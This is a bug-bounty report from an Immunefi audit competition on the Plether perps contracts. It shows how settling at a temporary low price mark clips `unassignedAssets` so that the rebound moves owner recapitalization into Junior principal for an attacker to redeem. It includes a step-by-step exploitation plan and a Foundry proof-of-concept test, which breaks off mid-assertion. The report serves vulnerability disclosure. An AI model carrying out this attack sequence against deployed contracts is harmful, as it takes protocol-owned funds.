# \#99885 [SC-Medium] A settlement at a temporary low mark permanently clips `unassignedAssets` in `planReconcile`, and the rebound moves the owner's recapitalization into Junior principal that the attacker redeems

**Submitted on Nov 15th 2026 at 16:24:54 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99885
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Affected contracts (in-scope commit `a82d4fef`; live on Arbitrum Sepolia v2.0.0)

The program states that the v2.0.0 Arbitrum Sepolia release is built from a commit whose `packages/perps/src` is identical to `a82d4fef`. The defect is in the reconciliation libraries that `HousePool` inlines (`HousePoolReconcilePlanLib`, `HousePoolPendingPreviewLib`) and in `HousePool._reconcile`, which stores their result. The proof of concept runs in the repository's Foundry suite at the in-scope commit, with the release parameters, Pyth mocked by the suite's `MockPyth` and USDG by the suite's mock settlement token. No in-scope contract is modified.

| Contract | Arbitrum Sepolia v2.0.0 address | Role in the issue |
|---|---|---|
| `HousePool` | `0xeb5604c393843b2f3c347ec24fa9ddad6ab2131e` | **Root cause.** `_reconcile` stores `unassignedAssets = min(U, D)` from the inlined `HousePoolReconcilePlanLib.planReconcile` and keeps no record of the clipped amount. The next reconcile routes the recovery through `HousePoolPendingPreviewLib.applyRevenueIntent` to the Senior gap and Junior principal. `assignUnassignedAssets` later pays the owner only what is left |
| `CfdEngine` | `0xca18a6783d7542f9d2f28f4f259772b74c4d6baa` | `recapitalizePool`, the owner's documented recovery action that creates `unassignedAssets` |
| `OrderRouter` | `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444` | Public `settleLpEpoch(bytes[])` the attacker calls as keeper at the low mark; public `commitOrder` / `executeOrder` / `updateMarkPrice` |
| `TrancheVault` (Junior) | `0x4a8b67184a1e3224c11a191cc69f22c50eef734e` | Junior redemptions that pay out the moved recapitalization |
| `TrancheVault` (Senior) | `0x5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d` | Senior redemption (unchanged apart from coupon dust) |
| `PletherOracle` | `0x4f2c62a0e03657f52c633c19c11f88d8f0897bb2` | Validates the `PoolReconcile` and order baskets |

Release configuration used (`packages/perps/DEPLOYMENT.md`): `vpiFactor` 0.01, `maxSkewRatio` 0.4, maintenance margin 0.1 %, initial margin 0.2 %, frozen-market margin 3 %, base carry 5 %, liquidation bounty 10 bps (minimum 1 USDG, 50 % keeper share), execution fee 0.04 % and settlement buffer 0.25 % (asserted), Senior cap 40,000,000 USDG and 80 % of the pool (applied through the owner's timelocked setter and asserted), Senior coupon 800 bps (pool default), Junior maintenance fee 0, 1 USDG seed in each tranche. The release Router configuration is applied through the owner's 72-hour timelocked path: `maxExecutionWindowSeconds` 60, `orderExecutionStalenessLimit` 60, `liquidationStalenessLimit` 15, `basketMaxConfidenceRatioBps` 10, `orderSettlementWindow` 15, `maxComponentPublishTimeDivergence` 5, `adverseConfidenceMultiplierBps` 2500, `minOpenNotionalAssets` 1,000 USDG, open-order bounty 1 bp (0.01–0.2 USDG), protection trigger bounty 0.2 USDG, `maxPendingOrders` 5, `minEngineGas` 600,000, `maxPruneOrdersPerCall` 64. Every mark moves at most 1 % and passes the oracle's ordering and freshness checks during a live Monday session (no frozen-market mode).

## Brief/Intro

`unassignedAssets` (U) holds pool value that has no LP owner, typically the part of an owner recapitalization that exceeds the Senior high-water-mark gap. Only the owner may assign it, through `assignUnassignedAssets`. The protocol's stated invariant is that this value "cannot silently become windfall LP ownership" and that "recapitalization never accrues to junior principal".

Reconciliation protects U behind both tranches: a loss is charged to Junior, then Senior, and reaches U only when terminal distributable value D falls below U. At that point `HousePoolReconcilePlanLib.planReconcile` clips U to D, and `HousePool._reconcile` stores the clipped value. Nothing records how much was clipped. When the price recovers, the next reconcile finds zero claimed principal and routes the whole recovery through `applyRevenueIntent`: first to the Senior high-water-mark gap, then to Junior principal. U is never restored. A temporary mark-to-market dip is therefore turned into a permanent transfer of the owner's recapitalization capital to Junior holders.

Any caller can decide whether the dip is persisted, because LP settlement is permissionless through `OrderRouter.settleLpEpoch`. An incumbent Junior LP opens a position that U helps back, waits for an ordinary 2 % basket move, settles at the low mark with its own 2 USDG redemption as progress, waits for the rebound, and redeems.

In the proof of concept, after the owner's documented `recapitalizePool(1,000,000)`, the 2 % dip-and-rebound clips U from 1,000,000.000000 to 995,341.236707 USDG. The owner's later `assignUnassignedAssets` receives **4,658.763293 USDG less** than in the control run without the low-mark settlement. Junior principal after the rebound is higher by 4,658.825625 USDG (the clipped amount plus 0.062332 USDG, mostly Senior coupon that did not accrue while Senior principal was zero), and the attacker's total balance is **+3,743.147766 USDG** higher (80.34 % of the clipped amount). The honest Junior LP receives the rest. With a 3 % move the owner loses **14,648.763293 USDG** and the attacker gains **11,769.653065 USDG**. The attacker's trading accounts end with the same balance in the attack and the control run, so the whole gain is the clipped recapitalization.

Impact: **Critical — Direct theft of funds** (protocol recapitalization capital held in `unassignedAssets` is moved into Junior principal and redeemed by the attacker).

## Vulnerability Details

### `unassignedAssets` is the last loss layer, and a reconcile clips it to distributable value

`HousePoolReconcilePlanLib.sol`, lines 68–82:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}

plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;

if (plan.claimedEquityZero) {
    uint256 seededDistributableToClaims = snapshot.distributable > plan.state.unassignedAssets
        ? snapshot.distributable - plan.state.unassignedAssets
        : 0;
    HousePoolPendingPreviewLib.applyRevenueIntent(plan.state, seededDistributableToClaims);
    return plan;
}
```

The ordinary waterfall below these lines compares `distributable - unassignedAssets` with claimed principal and charges any shortfall to Junior, then Senior (lines 84–105). U is touched only when D is below U, which means both tranches are already wiped. Lines 73–74 then lower U to D.

### The clip is stored, and nothing remembers it

`HousePool.sol`, lines 1584–1596:

```solidity
_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;

if (markFresh) {
    terminalDeficitAssets = reconcileSnapshot.deficit;
    lastReconcileTime = block.timestamp;

    uint256 juniorRevenueWithoutOwners = HousePoolReconcilePlanLib.juniorRevenueWithoutOwners(plan);
    if (juniorRevenueWithoutOwners > 0) {
        juniorPrincipal -= juniorRevenueWithoutOwners;
        unassignedAssets += juniorRevenueWithoutOwners;
    }
}
```

There is no "unassigned high-water mark" or deficit field. The only way back into U is the `juniorRevenueWithoutOwners` branch, which applies only when Junior has zero share supply. With live Junior holders it never applies.

The Senior tranche has exactly the protection U lacks. `absorbLoss` keeps the Senior high-water mark through a loss: it is "deliberately unchanged so future revenue continues to restore senior impairment" (`HousePoolWaterfallAccountingLib.sol`, lines 162–163).

### The recovery goes to the Senior gap and Junior principal, never back to U

After the clip, stored Senior and Junior principal are both zero, so the next reconcile at a recovered mark takes the `claimedEquityZero` branch above and passes `D - U'` to `applyRevenueIntent`.

`HousePoolPendingPreviewLib.sol`, lines 158–188:

```solidity
function applyRevenueIntent(
    PendingAccountingState memory state,
    uint256 amount,
    bool allowClaimedEquity
) internal pure {
    if (!allowClaimedEquity && state.waterfall.seniorPrincipal + state.waterfall.juniorPrincipal != 0) {
        state.unassignedAssets += amount;
        return;
    }

    uint256 remaining = amount;
    if (state.seniorSupply > 0) {
        uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
            ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
            : 0;
        if (gap > 0) {
            uint256 seniorAssignedAssets = remaining > gap ? gap : remaining;
            state.waterfall.seniorPrincipal += seniorAssignedAssets;
            remaining -= seniorAssignedAssets;
        }
    }

    if (remaining > 0 && state.juniorSupply > 0) {
        state.waterfall.juniorPrincipal += remaining;
        remaining = 0;
    }

    if (remaining > 0) {
        state.unassignedAssets += remaining;
    }
}
```

Senior is restored to its preserved high-water mark, and everything else, including the U that was clipped, becomes Junior principal. In the proof of concept, the stored Senior high-water mark of 5,001.154576 USDG is restored exactly, and Junior principal receives the 4,658.763293 USDG clipped from U.

### What the protocol promises about `unassignedAssets`

The code and documentation state that ownerless value, and recapitalization in particular, must not reach LP principal without the owner's explicit assignment:

- `HousePoolPendingPreviewLib.sol`, lines 103–107 (the recapitalization router): "Any remainder, including all value when there are no senior owners, becomes unassigned; recapitalization never accrues to junior principal."
- `HousePool.sol`, line 657 (`assignUnassignedAssets`): "Prevents later LPs from implicitly capturing previously ownerless value."
- `INTERNAL_ARCHITECTURE_MAP.md`, line 75: "Unassigned assets | Recognized Pool assets lacking an LP claimant path | Require explicit assignment; cannot silently become windfall LP ownership."
- `ACCOUNTING_SPEC.md`, lines 356–357: "Revenue with no eligible share owner is routed to `unassignedAssets`; a new depositor cannot acquire it simply by being first to deposit."

The clip-and-recover path breaks all of these. Without any assignment, the recapitalization becomes Junior principal and is redeemed as ordinary Junior NAV.

### What the attacker controls

The attacker does not move the market. It controls three things, all through public calls:

1. **Exposure.** U is pool capital, so it counts as backing for new positions. After the 1,000,000 USDG recapitalization, the pool's assets are 1,015,321.236707 USDG against 999,000 USDG of maximum LONG liability. The attacker can therefore hold a 999,000 USDG LONG against about 10,000 USDG of tranche capital, which puts the clip threshold at about a 1.5 % move.
2. **Whether the dip is persisted.** `OrderRouter.settleLpEpoch` is permissionless. The attacker calls it with a valid `PoolReconcile` basket at the low mark. Settlement needs queue progress, and the attacker supplies it with its own 2 USDG Junior redemption. At zero Junior NAV that redemption is refunded, which counts as progress. Without this call, as in the control run, the dip is never recorded and U stays whole.
3. **Timing.** The clip can only be persisted once D < U. At a 1 % move (D = 1,005,331.236707 USDG > U), the pending reconcile charges only Junior, and a settlement reverts with `HousePool__NoLpEpochProgress`. At 2 % the preview wipes both tranches and the settlement goes through (`test_Threshold_ClipRequiresDistributableBelowUnassigned`).

### The objections: "ownerless telemetry", an exogenous move, and the honest Junior LP's gain

**U is ownerless, so nobody is robbed.** U has no *LP* owner, but it is not free for anyone to take. It is protocol capital that came from the owner's wallet through `recapitalizePool`, and only the owner can assign it. In the proof of concept the owner assigns it with `assignUnassignedAssets` and receives 4,658.763293 USDG less (14,648.763293 at 3 %). `ACCOUNTING_SPEC.md` line 652 ("`unassignedAssets` should be exceptional telemetry, not a normal operating bucket") describes how often U is expected to be non-zero, not who may take it. The program states: "A report is not out of scope only because a privileged address is affected by the exploit", and "a legitimate, documented action by a trusted role that triggers a bug harming users or the protocol" is in scope. The owner's only action before the attack is the documented `recapitalizePool`. SECURITY.md describes it as an immediate recovery action ("The pool queues claimant allocation for normal reconciliation"), and `ACCOUNTING_SPEC.md` line 642 says reconciliation "allocates the queued amount to senior restoration or unassigned assets".

**The move is exogenous.** The attacker needs a real 2 % basket move followed by a rebound, and it holds an ordinary directional position while waiting. The defect does not depend on who causes the move. It is that a *temporary* mark becomes *permanent* ownership accounting whenever someone settles at it, and settling is a public action the attacker chooses. The attacker's trading accounts end with 155,094.080122 USDG in the attack run and 155,094.081507 USDG in the control run. The low-mark settlement adds no trading cost and no trading risk beyond what the position already carries in both runs. Under the program's feasibility rules, impact is assessed first and feasibility limitations change only the amount paid, not the severity.

**The honest Junior LPs gain too.** They do. The clipped recapitalization is credited to Junior principal pro rata, so the honest Junior LP in the proof of concept receives 914.742596 USDG more. That does not reduce the theft. The protocol loses 4,658.763293 USDG, and the attacker, who holds most of the Junior supply, takes 80.34 % of it. A larger Junior position captures a larger share.

**The Senior LP is not harmed.** Its high-water mark is restored exactly. It receives 5,000.152993 USDG against 5,000.213928 USDG in the control run, a 0.060935 USDG difference in coupon accrued while Senior principal was zero.

## Exploitation

All steps below are in `test_Attack_TwoPercentDipSettlementMovesRecapitalizationIntoJunior`. The control run starts from the same EVM snapshot, with identical marks, trades and timing, and omits only step 6. LP capital, trades, marks and settlements go through the public `TrancheVault`, `HousePool`, `OrderRouter` and `CfdEngine` entry points.

1. **Setup (Monday 10:00 UTC, live FX session).** Through the public request/settle/claim path, Junior receives the attacker's 4,000 USDG, two attacker wallets' 20 and 2 USDG, and an honest Junior LP's 978 USDG. Senior receives an honest Senior LP's 5,000 USDG. Each tranche also holds its 1 USDG seed.
2. **Owner, documented action.** The owner calls `CfdEngine.recapitalizePool(1,000,000 USDG)` while Senior sits at its high-water mark. The 20 USDG attacker wallet exits through an ordinary settlement, which applies the recapitalization. Because there is no Senior gap, all of it becomes unassigned. State: U = 1,000,000.000000, Senior principal = Senior high-water mark = 5,001.093021, Junior principal = 4,980.907345.
3. **Attacker positions.** Two attacker trading accounts, each funded with 80,000 USDG, open three interleaved LONG/SHORT pairs of 333,000 USDG notional with 20,000 USDG margin each order, within the 40 % skew cap. The SHORT account then closes at the entry price of 1.00. A 999,000 USDG LONG remains. Maximum liability is 999,000.000000 against pool assets of 1,015,321.236707.
4. The 2 USDG attacker wallet requests redemption of its whole Junior balance, which provides queue progress for step 6.
5. **Dip.** Ordinary marks every 10 minutes: 1.00 → 0.99 → 0.98. At 0.98, terminal distributable D = 995,341.236707 < U.
6. **Attacker as keeper.** The attacker calls `OrderRouter.settleLpEpoch` with a valid `PoolReconcile` basket at 0.98. The 2 USDG head is refunded at zero Junior NAV (0 shares funded). Afterwards: Senior principal 0, Junior principal 0, Senior high-water mark 5,001.154576, **U = 995,341.236707**.
7. The Senior LP, the attacker and the honest Junior LP request full redemptions. One hour later, the price returns to 1.00 in two 1 % marks, and the attacker closes its LONG at 1.00.
8. A keeper settles (no open positions). Recovery reconcile: Senior principal 5,001.154576 (restored to its high-water mark), **Junior principal 13,745.128961** (control: 9,086.303336), **U stays 995,341.236707** (control: 1,000,000.000000).
9. Claims: attacker 11,038.051167 USDG (control 7,296.772655), honest Junior LP 2,698.803510 (control 1,784.060914), Senior LP 5,000.152993 (control 5,000.213928).
10. **Owner, documented action.** `assignUnassignedAssets(false, receiver)` assigns **995,341.236707** USDG (control: 1,000,000.000000).
11. Attacker total (Junior redemption, both wallets, both trading accounts): 166,157.649948 USDG against 162,414.502182 in the control run, **+3,743.147766 USDG**. The attacker's net result moves from -1,607.497818 to +2,135.649948 USDG on 164,022 USDG deposited.

`test_Attack_ThreePercentDipClipScalesWithMove` repeats the scenario with a 3 % dip (three 1 % marks to 0.97): U is clipped to 985,351.236707, the owner loses 14,648.763293 USDG, and the attacker gains 11,769.653065 USDG (net +10,161.815609 instead of -1,607.837456).

## Impact Details

**Critical — Direct theft of funds.** Protocol-owned recapitalization capital in `unassignedAssets` is transferred into Junior principal and redeemed by an unprivileged Junior LP. Nobody assigns it, and it does not pass through any owner decision.

- **Protocol loss:** 4,658.763293 USDG with a 2 % move and 14,648.763293 USDG with a 3 % move. Each is the exact shortfall in the owner's later `assignUnassignedAssets`. The clip equals the amount by which terminal distributable value falls below U at the settled mark, so it is bounded only by U.
- **Attacker gain:** +3,743.147766 USDG (2 %) and +11,769.653065 USDG (3 %), 80.34 % of the clipped amount in both runs (its share of Junior supply). The rest goes to the honest Junior LP. The Senior LP's result is unchanged apart from 0.06 USDG of coupon.
- **Reachability:** the owner's only pre-attack action is a documented `recapitalizePool`. Any recapitalization above the Senior high-water-mark gap lands in U through normal reconciliation, as `ACCOUNTING_SPEC.md` line 642 states. U then backs new positions. Every attacker step is a public call (`requestDeposit`, `requestRedeem`, `commitOrder`, `executeOrder`, `updateMarkPrice`, `OrderRouter.settleLpEpoch`, `claimRedeem`). The market path is two ordinary 1 % marks down and two back. While U is non-zero, deposits are blocked, so the beneficiaries are the incumbent Junior holders, and the attacker is one of them.
- **No undo:** once the clip is stored, no field remembers it, so no later reconcile restores U. The rebound reconcile in the proof of concept leaves U at 995,341.236707 USDG while Junior principal carries the difference, and the owner's documented assignment can only assign what is left.

## Recommendation

Give U the same loss memory that Senior already has. When a reconcile clips U, record the clipped amount, and restore it first on the following revenue, before the Senior gap and Junior:

```solidity
// HousePoolReconcilePlanLib.planReconcile
uint256 clipped = state.unassignedAssets > snapshot.distributable ? state.unassignedAssets - snapshot.distributable : 0;
plan.state.unassignedAssets = state.unassignedAssets - clipped;
plan.state.unassignedImpairmentAssets += clipped; // new stored field

// on any later revenue (claimed-zero seeding and waterfall revenue alike):
uint256 restore = _min(revenue, plan.state.unassignedImpairmentAssets);
plan.state.unassignedAssets += restore;
plan.state.unassignedImpairmentAssets -= restore;
revenue -= restore; // only the remainder reaches the Senior gap and Junior
```

`assignUnassignedAssets` should also clear the impairment field, so the owner's explicit assignment decides who absorbs a realized loss of U. An alternative that is easier to reason about is to keep U outside mark-to-market reconciliation and reserve it, like pending claimant buckets, so that only realized losses can reduce it.

Add a path-independence invariant test: for any dip-and-rebound mark sequence, U, Senior principal and Junior principal after the rebound must be the same whether or not a settlement happened at the intermediate low mark, apart from coupon accrual.

## Proof of Concept

Save the test below as `packages/perps/test/perps/poc/UnassignedAssetsClipRecovery.t.sol` and run from the repository root:

```bash
forge test --root packages/perps --match-contract UnassignedAssetsClipRecoveryPoC -vv
```

The file contains four tests:

- `test_Attack_TwoPercentDipSettlementMovesRecapitalizationIntoJunior`: control and attack from one snapshot, 2 % dip;
- `test_Attack_ThreePercentDipClipScalesWithMove`: the same with a 3 % dip;
- `test_Control_NoLowMarkSettlementKeepsRecapitalizationUnassigned`: the control run alone; U is untouched and the owner assigns the full 1,000,000 USDG;
- `test_Threshold_ClipRequiresDistributableBelowUnassigned`: at a 1 % move D stays above U, only Junior is charged in preview, and a settlement reverts with `HousePool__NoLpEpochProgress`. At 2 % both tranches are wiped and the settled U equals D.

It uses the repository's `BasePerpTest`, the suite's `MockPyth` and mock settlement token, and only public entry points for every non-owner action. There is no `vm.store`, `etch` or `mockCall` on in-scope contracts.

### Complete test:

<details>
<summary>Complete test </summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {HousePoolAccountingLib} from "@plether/perps/libraries/HousePoolAccountingLib.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @title A low-mark LP settlement clips `unassignedAssets` and the rebound credits the clipped recapitalization to
///        Junior principal
/// @notice Claimed impact: Critical - Direct theft of funds (owner recapitalization capital held as `unassignedAssets`
///         is moved into Junior principal that an incumbent Junior LP redeems).
///
///         Root cause: HousePoolReconcilePlanLib.planReconcile (lines 73-74) writes `unassignedAssets = min(U, D)` on a
///         reconcile whose terminal distributable D is below U, HousePool._reconcile (line 1585) stores it, and no
///         field remembers the clipped amount. The next reconcile at a recovered mark takes the claimed-zero branch
///         (lines 76-81): `applyRevenueIntent(D - U')` fills the Senior high-water-mark gap and then Junior principal.
///         Nothing restores U.
///
///         Scenario (release parameters; MockPyth and mock USDG are the only mocks; the owner performs one documented
///         action before the attack and one documented action after it):
///           1. LPs enter through request/settle/claim: Senior 5,000; Junior 5,000 (attacker 4,000 + two attacker
///              wallets 22, an honest Junior LP 978); 1 USDG seeds each.
///           2. Owner: CfdEngine.recapitalizePool(1,000,000) while Senior sits at its high-water mark. An ordinary
///              settlement routes all of it to `unassignedAssets` (no Senior gap to restore).
///           3. Attacker (two trading accounts) opens an interleaved 999k/999k LONG/SHORT hedge under the 40% skew
///              cap, then closes the SHORT at entry: 999k LONG exposure remains.
///           4. Ordinary <= 1% basket marks move the price down (the LONG gains). At the lowest mark the attacker,
///              acting as a permissionless keeper, calls Router.settleLpEpoch with a valid PoolReconcile update;
///              progress is a 2 USDG Junior redemption from an attacker wallet that is refunded at zero Junior NAV.
///           5. The price returns to 1.00. The attacker closes the LONG at entry; a permissionless settlement funds
///              everyone's full exits (Senior LP, attacker, the honest Junior LP).
///           6. Owner: assignUnassignedAssets(false, receiver), the documented way to recover ownerless value.
///         Control: identical marks, trades and timing without the settlement at the low mark.
contract UnassignedAssetsClipRecoveryPoC is BasePerpTest {

    // --- actors ---
    address internal constant SENIOR_LP = address(0x5E1105);
    address internal constant ATTACKER = address(0xA77AC4); // incumbent Junior LP; also trader owner and keeper
    address internal constant ATK_LONG = address(0xA770A1); // attacker trading account (LONG leg)
    address internal constant ATK_SHORT = address(0xA770C2); // attacker trading account (SHORT leg)
    address internal constant HELPER_A = address(0xA77A01); // attacker helper: progress for the recap settlement
    address internal constant HELPER_B = address(0xA77A02); // attacker helper: progress for the low-mark settlement
    address internal constant OTHER_JR = address(0x1D2001); // a second, honest incumbent Junior LP (not the attacker)
    address internal constant KEEPER = address(0xE0EC);
    address internal constant OWNER_RECEIVER = address(0x0E1105);

    // --- scenario constants ---
    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant PRICE_STEP = 1_000_000; // 0.01 = one ordinary <= 1% basket mark
    uint256 internal constant STEP_SECONDS = 10 minutes;
    uint256 internal constant SENIOR_DEPOSIT = 5000e6;
    uint256 internal constant ATTACKER_JUNIOR = 4000e6;
    uint256 internal constant OTHER_JUNIOR = 978e6;
    uint256 internal constant HELPER_A_JUNIOR = 20e6;
    uint256 internal constant HELPER_B_JUNIOR = 2e6;
    uint256 internal constant RECAP = 1_000_000e6;
    uint256 internal constant CHUNK_SIZE = 333_000e18; // 333,000 USDG notional per order at 1.00
    uint256 internal constant CHUNKS = 3; // 999,000 USDG per leg, interleaved to respect maxSkewRatio
    uint256 internal constant CHUNK_MARGIN = 20_000e6;
    uint256 internal constant TRADER_FUNDING = 80_000e6;

    uint256 internal curPrice;
    uint256 internal orderNonce;
    uint256 internal helperBRequest;
    uint256 internal helperBShares;
    uint256 internal helperAUsdg;

    struct Run {
        uint256 dipPrice;
        bool dipSettled;
        uint256 dDip; // terminal distributable at the lowest mark (same lens the pool uses)
        uint256 sDip;
        uint256 jDip;
        uint256 hDip;
        uint256 uDip;
        uint256 previewS; // getPendingTrancheState right before the recovery settlement
        uint256 previewJ;
        uint256 sRec; // after the recovery reconcile (funded exits added back)
        uint256 jRec;
        uint256 hBeforeRec;
        uint256 uRec;
        uint256 juniorSupplyRec;
        uint256 seniorUsdg;
        uint256 attackerUsdg;
        uint256 otherUsdg;
        uint256 helperBValue;
        uint256 traderBalances;
        uint256 assigned;
        uint256 attackerTotal;
    }

    // ------------------------------------------------------------------ configuration (release values)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // packages/perps/DEPLOYMENT.md "Initial release parameters".
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _applyReleaseRouterConfig();
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior exposure cap");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        vm.warp(SETUP_TIMESTAMP + 7 days); // Monday 10:00 UTC, live FX session
        curPrice = ENTRY_PRICE;
        _refreshMark(curPrice);

        uint256 a = _requestDeposit(juniorVault, ATTACKER, ATTACKER_JUNIOR);
        uint256 o = _requestDeposit(juniorVault, OTHER_JR, OTHER_JUNIOR);
        uint256 ha = _requestDeposit(juniorVault, HELPER_A, HELPER_A_JUNIOR);
        uint256 hb = _requestDeposit(juniorVault, HELPER_B, HELPER_B_JUNIOR);
        _warpTo(juniorVault.depositEpochStart(a));
        _refreshMark(curPrice);
        pool.settleLpEpoch(0, 0);
        _claimDeposit(juniorVault, ATTACKER, a);
        _claimDeposit(juniorVault, OTHER_JR, o);
        _claimDeposit(juniorVault, HELPER_A, ha);
        _claimDeposit(juniorVault, HELPER_B, hb);
        uint256 s = _requestDeposit(seniorVault, SENIOR_LP, SENIOR_DEPOSIT);
        _warpTo(seniorVault.depositEpochStart(s));
        _refreshMark(curPrice);
        pool.settleLpEpoch(0, 0);
        _claimDeposit(seniorVault, SENIOR_LP, s);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // deposit cooldown
        _refreshMark(curPrice);
    }

    // ------------------------------------------------------------------ tests

    /// @notice Attack: a 2% basket move against the LP while U = 1,000,000 and S + J ~= 10k. Runs the control branch
    ///         and the attack branch from one snapshot and compares them.
    function test_Attack_TwoPercentDipSettlementMovesRecapitalizationIntoJunior() external {
        _prefix();
        uint256 snap = vm.snapshotState();
        Run memory c = _branch(98_000_000, false);
        vm.revertToState(snap);
        Run memory a = _branch(98_000_000, true);
        _report(a, c);
        _assertClipTransfer(a, c);
    }

    /// @notice Attack, deeper variant: a 3% move (three ordinary 1% marks); the clip scales with the move.
    function test_Attack_ThreePercentDipClipScalesWithMove() external {
        _prefix();
        uint256 snap = vm.snapshotState();
        Run memory c = _branch(97_000_000, false);
        vm.revertToState(snap);
        Run memory a = _branch(97_000_000, true);
        _report(a, c);
        _assertClipTransfer(a, c);
    }

    /// @notice Control alone: same marks, trades and timing, no settlement at the low mark. U is never touched and the
    ///         owner's documented assignment recovers the whole recapitalization.
    function test_Control_NoLowMarkSettlementKeepsRecapitalizationUnassigned() external {
        _prefix();
        Run memory c = _branch(98_000_000, false);
        assertEq(c.uDip, RECAP, "control: U unchanged at the low mark");
        assertEq(c.uRec, RECAP, "control: U unchanged after the rebound");
        assertEq(c.assigned, RECAP, "control: owner assigns the whole recapitalization");
        emit log_named_decimal_uint("CONTROL owner assigned", c.assigned, 6);
    }

    /// @notice Threshold: the clip needs D < U, i.e. both tranches wiped at the settled mark.
    ///         At a 1% move D stays above U: the pending reconcile charges Junior first, Senior and U are untouched,
    ///         and no settlement can even persist it (the Junior head has value but free cash is 0 while the open
    ///         interest's max profit is reserved, so the call reverts with no progress). One more 1% mark takes D below
    ///         U: the preview wipes both tranches, the zero-NAV head is refunded (progress) and the clip persists.
    function test_Threshold_ClipRequiresDistributableBelowUnassigned() external {
        _prefix();
        uint256 s0 = pool.seniorPrincipal();
        _warpTo(pool.lpEpochStart(helperBRequest) + 60);
        _markStep(99_000_000);
        uint256 d = _distributable();
        (uint256 pS, uint256 pJ,,) = pool.getPendingTrancheState();
        _log("---------------- 1% move (0.99) ----------------");
        emit log_named_decimal_uint("D at 0.99", d, 6);
        emit log_named_decimal_uint("preview Senior after reconcile", pS, 6);
        emit log_named_decimal_uint("preview Junior after reconcile", pJ, 6);
        assertGt(d, RECAP, "1% move must leave D above U");
        assertApproxEqAbs(pS + pJ, d - RECAP, 1e6, "tranches must carry the whole loss while D > U");
        assertApproxEqAbs(pS, s0, 1e6, "Senior untouched while Junior absorbs");
        assertGt(pJ, 0, "Junior not wiped at 1%");
        _nextBlock();
        bytes[] memory tick = _liveTick(curPrice);
        vm.prank(ATTACKER);
        vm.expectRevert(bytes4(keccak256("HousePool__NoLpEpochProgress()")));
        router.settleLpEpoch(tick);
        assertEq(pool.unassignedAssets(), RECAP, "U changed");

        _markStep(98_000_000);
        d = _distributable();
        (pS, pJ,,) = pool.getPendingTrancheState();
        _log("---------------- 2% move (0.98) ----------------");
        emit log_named_decimal_uint("D at 0.98", d, 6);
        emit log_named_decimal_uint("preview Senior after reconcile", pS, 6);
        emit log_named_decimal_uint("preview Junior after reconcile", pJ, 6);
        assertLt(d, RECAP, "2% move must take D below U");
        assertEq(pS + pJ, 0, "both tranches wiped once D < U");
        _nextBlock();
        tick = _liveTick(curPrice);
        vm.prank(ATTACKER);
        router.settleLpEpoch(tick);
        assertEq(pool.unassignedAssets(), d, "U clipped to D");
        emit log_named_decimal_uint("U after the persisted low-mark settlement", pool.unassignedAssets(), 6);
    }

    // ------------------------------------------------------------------ assertions

    function _assertClipTransfer(
        Run memory a,
        Run memory c
    ) internal view {
        // The low mark pushes terminal distributable below U: both tranches are wiped and U is clipped to D.
        assertLt(a.dDip, RECAP, "dip did not take D below U");
        assertEq(a.sDip, 0, "Senior principal must be fully wiped when D < U");
        assertEq(a.jDip, 0, "Junior principal must be fully wiped when D < U");
        assertEq(a.uDip, a.dDip, "U must be clipped exactly to D (no pending buckets)");
        assertEq(c.uDip, RECAP, "control: no reconcile at the low mark, U unchanged");
        // Recovery: U is not restored; the clipped amount sits in tranche principal instead.
        uint256 clip = RECAP - a.uDip;
        assertEq(juniorVault.claimableRedeemRequest(helperBRequest, HELPER_B), 0, "helper head was funded");
        assertEq(a.uRec, a.uDip, "U must stay clipped after the recovery reconcile");
        assertGt(a.sRec + a.jRec, c.sRec + c.jRec, "tranches did not gain");
        assertGt(a.jRec, c.jRec, "Junior did not gain");
        assertGt(c.assigned, a.assigned, "owner assignment not reduced");
        assertEq(c.uRec, RECAP, "control U intact after the same recovery");
        assertApproxEqAbs((a.sRec + a.jRec) - (c.sRec + c.jRec), clip, 1e6, "tranches gain the clipped amount");
        assertApproxEqAbs(a.sRec, c.sRec, 1e6, "Senior only restored to its HWM");
